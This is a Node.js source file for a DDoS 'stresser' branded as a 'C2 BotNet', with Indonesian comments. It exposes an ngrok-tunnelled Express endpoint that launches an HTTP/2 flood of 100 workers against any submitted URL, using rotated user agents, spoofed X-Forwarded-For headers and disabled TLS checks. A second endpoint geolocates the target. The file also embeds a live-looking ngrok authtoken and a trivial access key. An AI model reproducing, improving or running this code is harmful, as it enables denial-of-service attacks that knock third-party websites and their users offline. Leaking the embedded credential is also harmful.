require('colors');
const express = require('express');
const ngrok = require('ngrok');
const http2 = require('http2');
const crypto = require('crypto');
const fetch = require('node-fetch');
const app = express();
const bodyParser = require('body-parser');
app.use(bodyParser.json());

//========= BIAR PORT RANDOM =========//
let C = false;
let currentPort = Math.floor(Math.random() * (60000 - 3000 + 1)) + 3000;

//========= GAUSAH DI GANTI NYET =========//
const L = () => {
  console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧
⠀⠀⠀⠀⠀⠀⠈⠀⠄⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈ [ # ] Dizflyze
⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿⠐ [ # ] C2 BotNet
⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀⠂⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] v1.3.2 
⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋⠡⠁⠈⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] 23 January
⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀⠐⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
⠙⢹⣿⣿⣿⠿⠋⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  `.cyan);
  console.log(`C2 BOTNET VERSION\n`.yellow);
};

//========= APIKEY BUAT TERMUX =========//
const N = async () => {
  try {
    await ngrok.authtoken('2xdnPcPH41TA26s84notWGL5pFV_4yyAxThJgiWnsxoqu2QAa');
    const url = await ngrok.connect({ proto: 'http', addr: currentPort, region: 'ap' });
    console.log(`${'🍁'.cyan} ${'╔═(api)Dizflyze Streser)\n  ╚═➤ '.bold} ${url.underline}`);
    console.log(`${'🐥'.yellow} ${'[ MENUNGGU ]'.yellow}\n`);
    return url;
  } catch (e) {
    console.log(`\n${'×'.red} ${'[ NGROK ERROR ] :'.bold} ${e.message}`);
    process.exit(1);
  }
};

//========= USER AGENT LIST =========//
const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.104 Safari/537.36 CrKey/1.54.248666',
  'Mozilla/5.0 (AmigaOS; U; AmigaOS 1.3; en-US; rv:1.8.1.21) Gecko/20090303 SeaMonkey/1.1.15',
  'Mozilla/5.0 (AmigaOS; U; AmigaOS 1.3; en; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14',
  'Mozilla/5.0 (Android 2.2; Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
  'Mozilla/5.0 (BeOS; U; BeOS BeBox; fr; rv:1.9) Gecko/2008052906 BonEcho/2.0',
  'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.1) Gecko/20061220 BonEcho/2.0.0.1',
  'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.10) Gecko/20071128 BonEcho/2.0.0.10',
  'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.17) Gecko/20080831 BonEcho/2.0.0.17',
  'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.6) Gecko/20070731 BonEcho/2.0.0.6',
  'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.7) Gecko/20070917 BonEcho/2.0.0.7',
  'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1b2) Gecko/20060901 Firefox/2.0b2',
  'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1',
  'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20060702 SeaMonkey/1.5a',
  'Mozilla/5.0 (BeOS; U; Haiku BePC; en-US; rv:1.8.1.10pre) Gecko/20080112 SeaMonkey/1.1.7pre',
];

//========= PAS ATTACK DI MULAI =========//
const attack = async (target, duration) => {
  console.log(`${'⚡'.yellow} ${'[ ATTACK ] :'.bold} ${target.underline}`);
  console.log(`${'⏳'.cyan} ${'[ DURASI ] :'.bold} ${duration.toString().yellow} Seccond\n`);
  const startTime = Date.now();

//========= FLOOD =========//
  const flood = async () => {
    try {
      const client = http2.connect(target, { rejectUnauthorized: false });
      client.on('error', () => {});
      await new Promise((resolve) => {
        const start = Date.now();
        const interval = setInterval(() => {
          if (Date.now() - start >= duration * 1000) {
            clearInterval(interval);
            client.close();
            resolve();
            return;
          }
          const req = client.request({
            ':method': 'GET',
            ':path': '/',
            'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
            'accept-language': 'en-US,en;q=0.9',
            'x-forwarded-for': `${crypto.randomInt(1, 255)}.${crypto.randomInt(0, 255)}.${crypto.randomInt(0, 255)}.${crypto.randomInt(1, 255)}`,
            'cache-control': 'no-cache'
          });
          req.on('response', () => req.close());
          req.end();
        }, 5); //========= BUAT TIME OUT =========//
      });
    } catch (e) {
    }
  };

//========= JANGAN TINGGI NGURAS CPU LU =========//
  const workerCount = 100; 
  const workers = Array.from({ length: workerCount }, () => flood());
  await Promise.all(workers);
  const totalTime = Math.round((Date.now() - startTime) / 1000);
  console.log(`${'✓'.green} SUCCESFULLY ${totalTime} Seccond`);
};

//========= START ATTACK =========//
app.post('/attack', async (req, res) => {
  if (C) return res.status(429).json({ error: '[ PROSES ]' });
  const { target, apiKey } = req.body;
  if (apiKey !== 'TERMUX_KEY') return res.status(403).json({ error: 'Invalid' });
  try {
    new URL(target);
    C = true;
    await attack(target, 100);
    C = false;
    res.status(200).json({ status: '[ STARTED ]', target });
  } catch (e) {
    C = false;
    res.status(400).json({ error: '[ URL INVALID! ]' });
  }
});

//========= INFO DI KIRIM KE TERMUX =========//
app.get('/info', async (req, res) => {
  try {
    const response = await fetch(`http://ip-api.com/json/${new URL(req.query.target).hostname}`);
    const data = await response.json();
    res.json(data);
  } catch (e) {
    res.status(500).json({ error: '[ GAGAL MENCARI INFORMASI ]' });
  }
});

L();

app.listen(currentPort, () => {
  console.log(`${'[ RUNNING ] :'.bold} ${currentPort.toString().yellow}`);
  N();
});
